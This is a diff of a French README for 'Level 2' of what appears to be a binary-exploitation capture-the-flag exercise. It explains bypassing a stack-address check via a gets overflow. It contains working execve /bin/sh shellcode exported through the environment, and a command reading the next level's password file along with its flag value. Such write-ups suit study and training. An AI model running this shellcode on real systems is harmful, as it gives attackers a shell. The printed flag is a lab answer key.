@@ -1,9 +1,8 @@
 # Level 2
 
-Ce binaire utilise aussi la fonction `gets` comme le niveau 1, cependant le programme à une protection qui vérifie si l'adresse de EIP n'est pas une adresse de la stack, commencant donc par `0xb...`, mais nous pouvons `jump` à l'adresse de return et la modifié par l'adresse de notre shellcode.
+Ce binaire utilise aussi la fonction [`gets`](https://linux.die.net/man/3/gets) comme le [niveau 1](/level1/README.md). Cependant le programme a une protection qui vérifie si l'adresse de EIP n'est pas une adresse de la stack, commencant donc par `0xb...`. Mais nous pouvons exporter un [*shellcode*](https://en.wikipedia.org/wiki/Shellcode) dans l'environnement, et *jump* à l'adresse de `return` et la modifier par l'adresse de notre shellcode.
 
-Nous pouvons importé notre shellcode dans l'`env` et lors du `ret` jump à cette adresse.
-
+Nous pouvons importer notre shellcode dans l'`env` et lors du `ret` jump à cette adresse :
 ```shell
 ~ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 ~ gdb level2
@@ -53,4 +52,3 @@ pwd
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
-
